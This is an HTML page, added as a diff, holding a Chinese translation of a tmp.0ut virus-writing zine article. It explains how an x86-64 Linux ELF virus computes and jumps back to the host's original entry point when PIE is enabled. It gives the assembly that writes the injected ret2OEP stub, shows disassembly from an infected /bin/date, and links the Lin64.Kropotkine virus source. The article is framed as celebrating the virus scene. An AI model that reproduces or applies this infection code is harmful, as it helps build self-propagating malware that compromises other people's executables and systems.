@@ -1,0 +1,148 @@
+<html>
+<head>
+<title>tmp.0ut</title>
+<meta charset="utf-8">
+<style>
+    body {
+      color: #FEFEFE;
+      background-color: #0c0d10;
+      margin: 0 auto;
+      padding: 1em 0 1em 0;
+    }
+@font-face { font-family: "gohu"; src: url("../../gohu.woff") format('woff'); }
+       pre { font-family: "gohu", "Lucida Console", monospace, Monaco; font-size: 14px; line-height: 1.0; }
+         a { color: #93ffd7; text-decoration: none; }
+</style>
+</head>
+<body>
+<center><div style="display: inline-block; text-align: left;"><pre>
+                                                           ┌───────────────────────┐
+                                                           ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄       │
+                                                           │ █   █ █ █ █   █       │
+                                                           │ █   █ █ █ █▀▀▀▀       │
+                                                           │ █   █   █ █     ▄     │
+                                                           │                 ▄▄▄▄▄ │
+                                                           │                 █   █ │
+                                                           │                 █   █ │
+                                                           │                 █▄▄▄█ │
+                                                           │                 ▄   ▄ │
+                                                           │                 █   █ │
+                                                           │                 █   █ │
+                                                           │                 █▄▄▄█ │
+                                                           │                 ▄▄▄▄▄ │
+                                                           │                   █   │
+在启用PIE的情况下返回原始入口点                                │                   █   │
+~ S01den                                                   └───────────────────█ ──┘
+
+由tmp.out团队的S01den倾情编写！
+
+--- 1) 引言 ---
+
+当我刚开始接触病毒世界时，我最初遇到的困难之一就是如何正确地返回宿主程序的原始入口点。
+这是每个称职的病毒都必须具备的核心功能，在过去实现起来非常简单（mov ebx, OEP ; jmp ebx）。
+
+你可能会问："为什么现在不那么容易了？"
+
+答案只有三个字母：PIE，即位置无关可执行文件（Position Independent Executable）。在
+这种二进制文件中，指令的地址在每次执行时都会被随机化（尽管有对齐要求）。因此OEP
+不再是一个常量，我们现在必须先计算它才能跳转过去。
+
+让我们来看看该如何做！
+
+--- 2) 在启用PIE的情况下返回OEP ---
+
+我将在这里描述我在Lin64.Kropotkine[0]中用于计算Ret2OEP的方法。
+我当时卡了几天，直到看到Elfmaster的一篇论文[1]让我豁然开朗。
+
+以下是代码：
+
+-------------------------------- CUT-HERE ------------------------------------------
+mov rcx, r15 ;r15保存了我们的病毒代码存储的地址（在栈中）
+add rcx, VXSIZE ; rcx现在包含病毒代码之后的第一个地址
+mov dword [rcx], 0xffffeee8 ; 相对调用get_eip（在13字节之前）
+mov dword [rcx+4], 0x0d2d48ff ; sub rax, (VXSIZE+5)
+mov byte  [rcx+8], 0x00000005
+mov word  [rcx+11], 0x0002d48
+mov qword [rcx+13], r9		 ; sub rax, entry0
+mov word  [rcx+17], 0x0000548
+mov qword [rcx+19], r12		; add rax, sym._start
+mov dword [rcx+23], 0xfff4894c 	; mov rsp, r14
+mov word  [rcx+27], 0x00e0		; jmp rax
+------------------------------------------------------------------------------------
+
+如你所见，我们逐字节将返回OEP的代码直接写入内存（在病毒代码之后，这样当之前的病毒代码
+执行完成后我们就可以跳转到这个例程）。这些字节将被写入宿主程序以进行感染。我们想要
+得到这样的结果：
+
+（这段代码来自我用Lin64.Kropotkine感染的/bin/date）
+
+-------------------------------- CUT-HERE ------------------------------------------
+; 病毒代码的结尾：
+get_rip:
+0x0c01ada3      488b0424       mov rax, qword [rsp]
+0x0c01ada7      c3             ret
+getdot:
+0x0c01ada8      e842fbffff     call 0xc01a8ef          ; 调用main
+0x0c01adad      2e0000         add byte cs:[rax], al   ; '.'
+; &lt;---- 病毒代码结束，我们想在这里注入我们的ret2OEP代码！
+; 我们想要在这里得到的代码：
+0x0c01adb0      e8eeffffff     call 0xc01ada3 ; 调用get_rip &lt;--
+0x0c01adb5      482d0d050000   sub rax, 0x50d ; sub rax, (VXSIZE+5)
+0x0c01adbb      482da8a8010c   sub rax, entry0
+0x0c01adc1      4805b0380000   add rax, 0x38b0 ;  add rax, sym._start
+0x0c01adc7      4c89f4         mov rsp, r14 ; 恢复原始栈
+0x0c01adca      ffe0           jmp rax
+------------------------------------------------------------------------------------
+
+基本上，计算OEP的思路并不复杂。
+假设宿主程序原始代码的第一条指令的偏移量（即非随机化的OEP）是0x38b0，并且当我们调用
+get_rip时（上面代码中的0x0c01adb0）RIP当前是0x55556156edb5（一个随机化的地址）。
+我们需要知道OEP的随机化地址才能跳转到它。
+
+好的，调用get_rip将RIP放入RAX，我们首先需要从RAX（0x55556156edb5）中减去病毒的大小
+（加上5，即call get_rip指令的大小）才能得到病毒代码开始的随机化地址：
+
+---&gt; 0x55556156edb5 - (0x508 + 5) = 0x55556156e8a8 ; 病毒代码第一条指令的地址
+
+现在，我们用这个值减去新的入口点，即病毒代码开始的非随机化地址（在病毒执行之前计算得到，
+在我们的例子中是0xc01a8a8）。
+
+实际上我们只是简单地做了这个：
+
+---&gt; 随机化的新入口点 - 非随机化的新入口点 (e_hdr.entry)
+
+用我们的值计算如下：
+
+---&gt; 0x55556156e8a8 - 0xc01a8a8 = 0x555555554000
+
+我们进行这个减法是为了提取随机化的"基址"。有了这个值，我们只需要将它加上原始的
+e_hdr.entry（非随机化的OEP）：
+
+---&gt; 0x555555554000 + 0x38b0 = 0x5555555578b0
+
+你就得到了一个可以跳转的正确地址！
+所以jmp rax将开始执行宿主程序的原始代码！
+
+--- 结论 ---
+总结一下，我们只是做了这样的事：
+
+---&gt; get_rip() - (VX_SIZE + 5) - new_EP + original-e_hdr.entry
+
+如你所见，就是简单的数学运算！;)
+病毒场景万岁！
+哪里有权威，哪里就没有自由。
+一切为了所有人。
+永远向前！
+
+--- 注释和参考文献 ---
+[0] https://github.com/vxunderground/MalwareSourceCode
+      /blob/main/VXUG/Linux.Kropotkine.asm
+[1] 现代ELF感染SCOP二进制文件的技术：
+    https://bitlackeys.org/papers/pocorgtfo20.pdf
+    - 特别是名为"Note on resolving Elf_Hdr-&gt;e_entry
+      in PIEexecutables"的部分
+
+--- 源代码 ---
+
+- <a href="../Linux.Kropotkine.asm">Linux.Kropotkine.asm</a>
+</pre></div></center></body></html> 
